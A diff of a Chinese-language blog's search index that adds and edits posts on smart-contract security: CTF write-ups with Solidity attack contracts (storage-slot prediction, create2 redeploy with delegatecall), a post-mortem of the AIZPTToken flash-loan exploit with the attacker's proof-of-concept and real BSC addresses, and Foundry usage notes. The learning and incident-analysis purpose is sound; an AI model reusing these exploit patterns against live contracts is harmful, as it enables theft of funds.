@@ -4,6 +4,51 @@
   
     
     <entry>
+      <title>矿工攻击</title>
+      <link href="/2024/10/16/%E7%9F%BF%E5%B7%A5%E6%94%BB%E5%87%BB/"/>
+      <url>/2024/10/16/%E7%9F%BF%E5%B7%A5%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>恶意攻击</title>
+      <link href="/2024/10/16/%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/"/>
+      <url>/2024/10/16/%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CTF-The lost Kitty</title>
+      <link href="/2024/10/15/CTF-The-lost-Kitty/"/>
+      <url>/2024/10/15/CTF-The-lost-Kitty/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CTF-The-lost-kitty"><a href="#CTF-The-lost-kitty" class="headerlink" title="CTF-The lost kitty"></a>CTF-The lost kitty</h1><p>题目就是Lucas在一个空间为2^256的房间丢失了一只猫，要求我们找到这只小猫，题目的源代码，如下：<br>&#x2F;&#x2F; SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;</p><p>contract HiddenKittyCat {<br>    address private immutable _owner;</p><p>    constructor() {<br>        _owner &#x3D; msg.sender;<br>        bytes32 slot &#x3D; keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</p><p>        assembly {<br>            sstore(slot, “KittyCat!”)<br>        }<br>    }</p><p>    function areYouHidingHere(bytes32 slot) external view returns (bool) {<br>        require(msg.sender &#x3D;&#x3D; _owner, “!owner”);<br>        bytes32 kittyPointer;</p><p>        assembly {<br>            kittyPointer :&#x3D; sload(slot)<br>        }</p><p>        return kittyPointer &#x3D;&#x3D; “KittyCat!”;<br>    }</p><p>    function destroyMe() external {<br>        require(msg.sender &#x3D;&#x3D; _owner, “!owner”);<br>        selfdestruct(payable(address(0)));<br>    }<br>}</p><p>contract House {<br>    bool public catFound;</p><p>    function isKittyCatHere(bytes32 _slot) external {<br>        if (catFound) {<br>            return;<br>        }<br>        HiddenKittyCat hiddenKittyCat &#x3D; new HiddenKittyCat();<br>        bool found &#x3D; hiddenKittyCat.areYouHidingHere(_slot);</p><p>        if (!found) {<br>            hiddenKittyCat.destroyMe();<br>        } else {<br>            catFound &#x3D; true;<br>        }<br>    }<br>}</p><p> 阅读完整个代码，好像似曾相识，原来在以前的ethernaut里见过，这个题类似于Ethernaut里的Flipflopcoin，都是答案已经出来了</p><p> 首先hidekittycat合约中的函数都有require（msg.sender&#x3D;&#x3D;owner）的验证，如果想直接调用areYoufindhere函数，这样会很难调用， 这kittycat题又是涉及到汇编的知识，不过这个汇编很好理解，slot为储存位置，使用sstore汇编语言，将kittycat储存到slot位置上，然而这个slot的具体值，已经在构造函数中计算出来了。再来看看house合约，在isKittyCathouse函数中，只要我们传入正确的_slot，就能使catFound变为ture,而正确的_slot在前面已经有了，所以我们只需要写一个攻击合约，如下：</p><p>&#x2F;&#x2F;SPDX-License-Identifier:MIT</p><p>pragma solidity ^0.8.0;</p><p>interface Ihouse{<br>     function isKittyCatHere(bytes32 _slot) external;<br>}<br>contract Attracker{<br>     Ihouse public target;</p><p>     constructor(address _target){<br>        target &#x3D; Ihouse(_target);<br>     }</p><p>     function pwn () external {<br>      bytes32 slot &#x3D; keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));<br>      target.isKittyCatHere(slot);<br>     }<br>}</p><p>先部署house合约，得到它的地址：0xE726d7E7739188f0fA45267997eA97b8b1D891E6</p><p>在部署Attracter合约，传入house合约的地址，调用pwn函数，即可</p><p>最后查看cat是否找到，CatFound就变为ture,说明已经找到cat.</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CTF-Creativity</title>
       <link href="/2024/10/14/CTF-Creativity/"/>
       <url>/2024/10/14/CTF-Creativity/</url>
@@ -11,6 +56,12 @@
         <content type="html"><![CDATA[<h1 id="CTF-Creativity"><a href="#CTF-Creativity" class="headerlink" title="CTF-Creativity"></a>CTF-Creativity</h1><p>题目：要求调用sendFlag(),记录事件<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Creativity &#123;</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line">    </span><br><span class="line">    address public target;</span><br><span class="line">    uint randomNumber = 0;</span><br><span class="line">    </span><br><span class="line">    function check(address _addr) public &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123; size := extcodesize(_addr) &#125;</span><br><span class="line">        require(size &gt; 0 &amp;&amp; size &lt;= 4);</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function execute() public &#123;</span><br><span class="line">        require(target != address(0));</span><br><span class="line">        target.delegatecall(abi.encodeWithSignature(&quot;&quot;));</span><br><span class="line">        selfdestruct(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function sendFlag() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 100000000 ether);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这题涉及到汇编，委托调用，还有一个不明显的create2的用法<br>  首先看到check函数，要求参数地址的合约代码大小不能超过4字节，这是很难办到的，在ethernaunt上遇到过这种类似的题，只不过那上面的题考察点没有这个题多。<br>  继续看到execute函数，首先进行了零地址的检查，在进行委托调用，最后是自毁函数<br>  如果我们要直接调用sendFlag函数，必须发送value大于100000000ehter，这是肯定是不可采取的措施，怎样才能绕过这个require,我们就要回到execute函数中，突破口是：target.detegatecall(),通过委托调用target合约，执行结果在Createtivity合约中，这样就清晰了<br>  我们可以通过create2的一个骚操作，在同一个地址上部署合约，合约的字节码可以不同，简单来说，就是在同一个地址上先后部署不同的合约，这样就可以实现，第一个部署的合约，满足自毁函数，第二个部署的合约，实现合约中的emit SendFlag事件<br>  接下来就是考虑如何用代码实现create的功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    bytes public deployBytecode;</span><br><span class="line">    address public deployedAddr;</span><br><span class="line">    </span><br><span class="line">    function deploy(bytes memory code) public &#123;</span><br><span class="line">        deployBytecode = code;</span><br><span class="line">        address a;</span><br><span class="line">        // Compile Dumper to get this bytecode</span><br><span class="line">        bytes memory dumperBytecode = hex&#x27;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&#x27;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866)</span><br><span class="line">        &#125;</span><br><span class="line">        deployedAddr = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Dumper &#123;</span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        Deployer dp = Deployer(msg.sender);</span><br><span class="line">        bytes memory bytecode = dp.deployBytecode();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            return (add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上有俩个代码，先部署Dumper合约，获得它的字节码，Deployer合约实现create2的功能<br>首先先将Deployer 部署，获得地址：0x307FdF03B1842A501F52221e4cF02D67BfeEc399<br>然后使用Deployer.deploy部署0x33ff，得到部署的合约地址0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663</p><p>调用check()，target就是我们部署的合约</p><p>然后在进行自毁，给我们已经部署的合约发一笔空交易，让它进行自毁，再次使用create2的操作，还是使用Deployer.deploy在这个地址部署另一个合约，合约的内容要包括emit SendFlag(0),<br>这里有个简单的hack合约<br>contract hack {<br>    event SendFlag(address addr);<br>    constructor() public {<br>        emit SendFlag(address(0));<br>    }<br>}<br>最后再调用execute函数，就会执行我们第二次部署的合约里的emit SendFlag;</p><p>完成以上步骤，就可以看到我们已经成功执行了emit SendFlag</p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>creat2的用法：在solidity 8.0版本之后，都是使用new关键字来创建合约，但是它还有一种就是使用内联汇编(assembly)</p><p>主要说一下，new的方法创建合约.直接上合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// 被创建合约</span><br><span class="line">contract Callee &#123;</span><br><span class="line">  string value1;</span><br><span class="line">  string value2;</span><br><span class="line"></span><br><span class="line">  // 构造函数有两个参数</span><br><span class="line">  constructor(string memory _value1,string memory _value2) &#123;</span><br><span class="line">    value1 = _value1;</span><br><span class="line">    value2 = _value2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 合约创建者</span><br><span class="line">contract ContractCreator &#123;</span><br><span class="line">  // 新合约地址</span><br><span class="line">  address public contractAddress;</span><br><span class="line"></span><br><span class="line">  // 创建合约</span><br><span class="line">  function newContract(string memory value1,string memory value2) external &#123;</span><br><span class="line">    // 生成盐值</span><br><span class="line">    bytes32 salt = keccak256(abi.encodePacked(value1,value2));</span><br><span class="line">    // 创建 Callee 合约实例，参数为 _salt, value1, value2</span><br><span class="line">    Callee callee = new Callee&#123;salt:salt&#125;(value1, value2);</span><br><span class="line">    // 设置新建合约的地址</span><br><span class="line">    contractAddress = address(callee);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>委托调用:看这俩篇<a href="https://learnblockchain.cn/article/5372">文章1</a>，<a href="https://blog.csdn.net/ak19920601/article/details/135908265">文章2</a>,讲的很好。</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
       
     </entry>
     
@@ -21,7 +72,7 @@
       <link href="/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
       <url>/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
       
-        <content type="html"><![CDATA[<h2 id="AIZPTToken攻击事件分析"><a href="#AIZPTToken攻击事件分析" class="headerlink" title="AIZPTToken攻击事件分析"></a>AIZPTToken攻击事件分析</h2><p>先大概描述一下：攻击者使用闪电贷借的钱，然后再购买了价值8000 BNB的AIPTToken,然后再以高价卖出，从中得到利润，还清借款，最终获得价值34BNB（约俩万美金）。</p><p>这是发生在最近的攻击，首先攻击者发现了这个AIZPTToken代币买卖的计算错误，下面是截取的AIZPTToken合约中的一段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buy() internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swapValue = msg.value;</span><br><span class="line"></span><br><span class="line">   uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">   require(token_amount &gt; 0, &#x27;Buy amount too low&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 user_amount = token_amount * 50 / 100;</span><br><span class="line">   uint256 fee_amount = token_amount - user_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(address(this), msg.sender, user_amount);</span><br><span class="line">   _transfer(address(this), feeReceiver, fee_amount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, swapValue, 0, 0, user_amount);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function sell(uint256 sell_amount) internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br><span class="line"></span><br><span class="line">   require(ethAmount &gt; 0, &#x27;Sell amount too low&#x27;);</span><br><span class="line">   require(address(this).balance &gt;= ethAmount, &#x27;Insufficient ETH in reserves&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swap_amount = sell_amount * 50 / 100;</span><br><span class="line">   uint256 burn_amount = sell_amount - swap_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(msg.sender, address(this), swap_amount);</span><br><span class="line">   _transfer(msg.sender, address(0), burn_amount);</span><br><span class="line"></span><br><span class="line">   payable(msg.sender).transfer(ethAmount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> receive() external payable &#123;</span><br><span class="line">   buy();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>从上面，可以发现，用少量的BNB购买AIZPTToken,就可以以高价出售，具体可以对比俩段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br></pre></td></tr></table></figure><p>第一个是买AIPTToken,如果以20的价钱购买12个代币，然后我们出售代币的时候，以同样的价格出售，那么代币的数量是不等于12的，换种方法来说，就是可以以高价出售相同代币的数量</p><p>下面是攻击者的攻击的测试合约</p><pre><code>//SPDX-License-Identifier: MITpragma solidity ^0.8.13;import &quot;forge-std/Test.sol&quot;import &quot;../interface.sol&quot;address constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;address constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;address constant AIZPT = 0xBe779D420b7D573C08EEe226B9958737b6218888;contract AIZPTTokentest is Test &#123;    address attracker = makeAddr(&quot;attracker&quot;);    function setUp() public&#123;        vm.creatPrankFork(&quot;bsc&quot;,42846998 - 1);    &#125;    function testPOC() public&#123;          vm.startPrank(attracker);          Attracker attracker = new Attrceker();          vm.label(address(attracker),&quot;attracek&quot;) ;          attracker.attrack();          console.log(&quot;&quot;)     &#125;&#125;interface IFS is IERC20&#123;    function flash(address recipient,uint256 amount0,uint256 amount1,bytes caaldata data) external;    function withdraw (uint256) external;    function deposit() exteranl paybale;&#125;contract Attracker&#123;    function attrack() external&#123;      IFS(Pancakev3Pool).flash(address(this),0,8000ehter,&quot;&quot;);            //将攻击合约中剩下的钱转给攻击者自己的地址        IERC20(weth).transfer(            msg.sender,             IERC20(weth).balanceOf(address(this))        );    &#125;     function pancakeV3FlashCallback(        uint256 fee0,        uint256 fee1,        bytes calldata data    ) external &#123;        IFS(weth).withdraw(8000 ether);             AIZPT.call&#123;value: 8000 ether&#125;(&quot;&quot;);        //出售200次        for (uint256 i; i &lt; 199; ++i) &#123;          //以383727 ether的价格卖出代币            IERC20(AIZPT).transfer(AIZPT, 3837275 ether);        &#125;        IFS(weth).deposit&#123;value: address(this).balance&#125;();         // 还清贷款和利息        IERC20(weth).transfer(PancakeV3Pool, 8004100000000000000000);    &#125;    receive() external payable&#123;&#125;&#125;从测试合约中来看,就是在执行闪电贷回调的时候,进行一个购买出售的操作完整的调用信息[点击](https://app.blocksec.com/explorer/tx/bsc/0x5e694707337cca979d18f9e45f40e81d6ca341ed342f1377f563e779a746460d?line=998&amp;debugLine=998)</code></pre>]]></content>
+        <content type="html"><![CDATA[<h2 id="AIZPTToken攻击事件分析"><a href="#AIZPTToken攻击事件分析" class="headerlink" title="AIZPTToken攻击事件分析"></a>AIZPTToken攻击事件分析</h2><p>先大概描述一下：攻击者使用闪电贷借的钱，然后再购买了价值8000 BNB的AIPTToken,然后再以高价卖出，从中得到利润，还清借款，最终获得价值34BNB（约俩万美金）。</p><p>这是发生在最近的攻击，首先攻击者发现了这个AIZPTToken代币买卖的计算错误，下面是截取的AIZPTToken合约中的一段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buy() internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swapValue = msg.value;</span><br><span class="line"></span><br><span class="line">   uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">   require(token_amount &gt; 0, &#x27;Buy amount too low&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 user_amount = token_amount * 50 / 100;</span><br><span class="line">   uint256 fee_amount = token_amount - user_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(address(this), msg.sender, user_amount);</span><br><span class="line">   _transfer(address(this), feeReceiver, fee_amount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, swapValue, 0, 0, user_amount);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function sell(uint256 sell_amount) internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br><span class="line"></span><br><span class="line">   require(ethAmount &gt; 0, &#x27;Sell amount too low&#x27;);</span><br><span class="line">   require(address(this).balance &gt;= ethAmount, &#x27;Insufficient ETH in reserves&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swap_amount = sell_amount * 50 / 100;</span><br><span class="line">   uint256 burn_amount = sell_amount - swap_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(msg.sender, address(this), swap_amount);</span><br><span class="line">   _transfer(msg.sender, address(0), burn_amount);</span><br><span class="line"></span><br><span class="line">   payable(msg.sender).transfer(ethAmount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> receive() external payable &#123;</span><br><span class="line">   buy();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>从上面，可以发现，用少量的BNB购买AIZPTToken,就可以以高价出售，具体可以对比俩段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br></pre></td></tr></table></figure><p>第一个是买AIPTToken,如果以20的价钱购买12个代币，然后我们出售代币的时候，以同样20的价格出售，那么购买人获得代币的数量是少于12的，换种方法来说，就是可以以高价出售相同代币的数量</p><p>下面是攻击者的攻击的测试合约</p><pre><code>//SPDX-License-Identifier: MITpragma solidity ^0.8.13;import &quot;forge-std/Test.sol&quot;import &quot;../interface.sol&quot;address constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;address constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;address constant AIZPT = 0xBe779D420b7D573C08EEe226B9958737b6218888;contract AIZPTTokentest is Test &#123;    address attracker = makeAddr(&quot;attracker&quot;);    function setUp() public&#123;        vm.creatPrankFork(&quot;bsc&quot;,42846998 - 1);    &#125;    function testPOC() public&#123;          vm.startPrank(attracker);          Attracker attracker = new Attrceker();          vm.label(address(attracker),&quot;attracek&quot;) ;          attracker.attrack();          console.log(&quot;&quot;)     &#125;&#125;interface IFS is IERC20&#123;    function flash(address recipient,uint256 amount0,uint256 amount1,bytes caaldata data) external;    function withdraw (uint256) external;    function deposit() exteranl paybale;&#125;contract Attracker&#123;    function attrack() external&#123;      IFS(Pancakev3Pool).flash(address(this),0,8000ehter,&quot;&quot;);            //将攻击合约中剩下的钱转给攻击者自己的地址        IERC20(weth).transfer(            msg.sender,             IERC20(weth).balanceOf(address(this))        );    &#125;     function pancakeV3FlashCallback(        uint256 fee0,        uint256 fee1,        bytes calldata data    ) external &#123;        IFS(weth).withdraw(8000 ether);             AIZPT.call&#123;value: 8000 ether&#125;(&quot;&quot;);        //出售200次        for (uint256 i; i &lt; 199; ++i) &#123;          //以383727 ether的价格卖出代币            IERC20(AIZPT).transfer(AIZPT, 3837275 ether);        &#125;        IFS(weth).deposit&#123;value: address(this).balance&#125;();         // 还清贷款和利息        IERC20(weth).transfer(PancakeV3Pool, 8004100000000000000000);    &#125;    receive() external payable&#123;&#125;&#125;从测试合约中来看,就是在执行闪电贷回调的时候,进行一个购买出售的操作完整的调用信息[点击](https://app.blocksec.com/explorer/tx/bsc/0x5e694707337cca979d18f9e45f40e81d6ca341ed342f1377f563e779a746460d?line=998&amp;debugLine=998)</code></pre>]]></content>
       
       
       
@@ -103,6 +154,12 @@
       
       
       
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
+      
     </entry>
     
     
@@ -125,7 +182,7 @@
       <link href="/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/"/>
       <url>/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/</url>
       
-        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>上次那个<a href="https://updraft.cyfrin.io/">网站</a>,里面有讲foundry，虽然以前学习过，但是还是没能具体学习过，只会一些测试的用法，其他高深的用法还没有了解到，借此机会再次学习一下，就写了这个笔记</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>推荐这个网站<a href="https://book.getfoundry.sh/">Foundry-Book</a>;<br>安装完成后，在终端使用指令：Forge –version 查看有没有安装好，如果没有，就删除从头再来一遍</p><p>我们使用的是windows的系统就要去找属于window安装教程（我就反复安装，吃了很多亏），如果你想使用windows上的子系统Linux,就可以在你的终端使用 wsl –install ,然后重启安装即可</p><h2 id="使用-（forge-）"><a href="#使用-（forge-）" class="headerlink" title="使用 （forge ）"></a>使用 （forge ）</h2><p>最开始我还没有了解到怎么自己用Foundry全是从仓库 git clone 下来，它自带Foundry,就不需要自己构建文件夹。现在就介绍一下怎么构建一个文件夹包含Foundry测试框架。（注意我们使用的是VSCODE这个软件，非常好用）</p><ul><li>首先创建一个文件夹，在git base终端上输入 forge init 文件夹名字</li><li>进入文件夹 cd 文件夹名字 </li><li>再构建项目 forge build 或则 forge compile</li><li>测试时使用 forge test 如果要测试，测试合约中的一个测试函数，是可以使用过滤条件方法：forge test –match-contract 测试合约名 –match-test 测试函数</li></ul><h2 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h2><p>一些Cast的指令：</p><ul><li>获取当前链的ID：cast chain-id</li><li>获取当前客户端版本：cast client</li><li>获取当前gas价格：cast gas-price</li><li>查询最新的区块号：cast block-number</li><li>获取当前的网络基础费：cast basefee</li><li>获取block的详细信息：cast block</li><li>获取区块的时间戳信息：cast age</li><li>查询特定的以太坊账户地址：cast balance 地址   如果不知道地址，就使用ENS查询：cast balance vitalik.eth</li><li>查看源代码：cast etherscan-source 地址</li></ul><h2 id="anvil"><a href="#anvil" class="headerlink" title="anvil"></a>anvil</h2><p>它可以提供一个方便测试和开发的以太坊节点<br>使用anvil指令，它可以输出账户，私钥，链ID，基本费用等<br>通过使用anvil-h,可以查看anvil所有的配置选项<br>使用anvil -a 数量，可以生成指定的数量开发账户</p><h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><p>Chisel是一个Solidity REPL,用于编写和测试Solidity代码片段，它提供了一个用于编程和执行ASolidity代码的交互式环境</p><h2 id="Forge-Std"><a href="#Forge-Std" class="headerlink" title="Forge Std"></a>Forge Std</h2><p>它是Forge标准库，为Foundry框架提供了丰富的辅组合约，简化和加速编写智能合约测试的过程并提升用户体验<br>使用Forge Std 只需要在测试合约导入Test.sol并继承Test</p><p>核心功能：<br>访问Hevm:通过vm实例直接使用，cheatcode模拟各种区块链状态和行为</p><blockquote><p>Hevm是DappHub团队开发的以太坊虚拟机实现，专门用于测试和调试智能合约，它是一个命令行工具，可以模拟以太坊网络的行为，允许开发人员在本地执行测试和调试它们的合约，而无需连接到实际的以太坊网络<br>断言和日志：从Dappsys Test 继承，具有断言功能和一Hardhat为风格的日志记录<br>标准库功能：Forge Std 提供的标准库包括各种实用的工具和功能，例如，向指定账户发送代币</p></blockquote><p>在Forge标准库的测试合约中，通过vm实例可以方便的访问作弊码<br>例如：身份转化：vm.prank;使用vm.prank()函数，我们可以暂时切换调用者的身份</p><h2 id="编写测试合约"><a href="#编写测试合约" class="headerlink" title="编写测试合约"></a>编写测试合约</h2><p>必要工作，导入：import “forge-std&#x2F;Test.sol”<br>setUP函数，是一个可选函数，在运行测试用例之前调用，用于初始化测试环境<br>以test为前缀的函数将被识别为测试用例并执行<br>testFail函数，用于指示预期的测试失败，如果此函数未触发还原，则测试失败</p><p>还有一些高级的测试技术：expectRevert：它是进行精准的错误处理，例如,vm.expectRevert(Some.Error.selector) &#x2F;&#x2F;可触发SomeError一些错误</p><p>共享设置：通过创建抽象合约并在测试合约中继承它，可以设置共享：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abstract contract SetupHelper &#123;</span><br><span class="line">    // Shared setup codes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyTest is Test, SetupHelper &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // Shared setup</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过共享设置可以避免在每个测试合约中重复相同的初始化代码，提高代码的可重用性和可维护性</p><p>导入文件，用<br>import “forge-std&#x2F;Test.sol”<br>这个是必要的</p>]]></content>
+        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>上次那个<a href="https://updraft.cyfrin.io/">网站</a>,里面有讲foundry，虽然以前学习过，但是还是没能具体学习过，只会一些测试的用法，其他高深的用法还没有了解到，借此机会再次学习一下，就写了这个笔记</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>推荐这个网站<a href="https://book.getfoundry.sh/">Foundry-Book</a>;<br>安装完成后，在终端使用指令：Forge –version 查看有没有安装好，如果没有，就删除从头再来一遍</p><p>我们使用的是windows的系统就要去找属于window安装教程（我就反复安装，吃了很多亏），如果你想使用windows上的子系统Linux,就可以在你的终端使用 wsl –install ,然后重启安装即可</p><h2 id="使用-（forge-）"><a href="#使用-（forge-）" class="headerlink" title="使用 （forge ）"></a>使用 （forge ）</h2><p>最开始我还没有了解到怎么自己用Foundry全是从仓库 git clone 下来，它自带Foundry,就不需要自己构建文件夹。现在就介绍一下怎么构建一个文件夹包含Foundry测试框架。（注意我们使用的是VSCODE这个软件，非常好用）</p><ul><li>首先创建一个文件夹，在git base终端上输入 forge init 文件夹名字</li><li>进入文件夹 cd 文件夹名字 </li><li>再构建项目 forge build 或则 forge compile</li><li>测试时使用 forge test 如果要测试，测试合约中的一个测试函数，是可以使用过滤条件方法：forge test –match-contract 测试合约名 –match-test 测试函数,也可以使用路径测试$ forge test –match-path test&#x2F;ContractB.t.sol</li></ul><h2 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h2><p>一些Cast的指令：</p><ul><li>获取当前链的ID：cast chain-id</li><li>获取当前客户端版本：cast client</li><li>获取当前gas价格：cast gas-price</li><li>查询最新的区块号：cast block-number</li><li>获取当前的网络基础费：cast basefee</li><li>获取block的详细信息：cast block</li><li>获取区块的时间戳信息：cast age</li><li>查询特定的以太坊账户地址：cast balance 地址   如果不知道地址，就使用ENS查询：cast balance vitalik.eth</li><li>查看源代码：cast etherscan-source 地址</li></ul><h2 id="anvil"><a href="#anvil" class="headerlink" title="anvil"></a>anvil</h2><p>它可以提供一个方便测试和开发的以太坊节点<br>使用anvil指令，它可以输出账户，私钥，链ID，基本费用等<br>通过使用anvil-h,可以查看anvil所有的配置选项<br>使用anvil -a 数量，可以生成指定的数量开发账户</p><h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><p>Chisel是一个Solidity REPL,用于编写和测试Solidity代码片段，它提供了一个用于编程和执行ASolidity代码的交互式环境</p><h2 id="Forge-Std"><a href="#Forge-Std" class="headerlink" title="Forge Std"></a>Forge Std</h2><p>它是Forge标准库，为Foundry框架提供了丰富的辅组合约，简化和加速编写智能合约测试的过程并提升用户体验<br>使用Forge Std 只需要在测试合约导入Test.sol并继承Test</p><p>核心功能：<br>访问Hevm:通过vm实例直接使用，cheatcode模拟各种区块链状态和行为</p><blockquote><p>Hevm是DappHub团队开发的以太坊虚拟机实现，专门用于测试和调试智能合约，它是一个命令行工具，可以模拟以太坊网络的行为，允许开发人员在本地执行测试和调试它们的合约，而无需连接到实际的以太坊网络<br>断言和日志：从Dappsys Test 继承，具有断言功能和一Hardhat为风格的日志记录<br>标准库功能：Forge Std 